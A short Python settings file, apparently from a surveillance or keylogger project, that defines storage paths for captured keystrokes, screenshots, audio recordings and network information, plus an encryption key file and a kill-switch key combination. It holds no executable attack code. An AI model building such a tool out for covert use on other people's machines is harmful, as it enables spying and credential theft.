from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
LOG_DIR = BASE_DIR / "logs"
DATA_DIR = BASE_DIR / "data"
SCREENSHOT_DIR = DATA_DIR / "screenshots"
KEYLOG_FILE = DATA_DIR / "keylogs.txt"
NETWORK_INFO_FILE = DATA_DIR / "network_info.txt"
AUDIO_FILE = DATA_DIR / "audio.wav"
ENCRYPTION_KEY_FILE = BASE_DIR / "encryption.key"
KILL_SWITCH_KEYS = {'ctrl', 'alt', 'l'}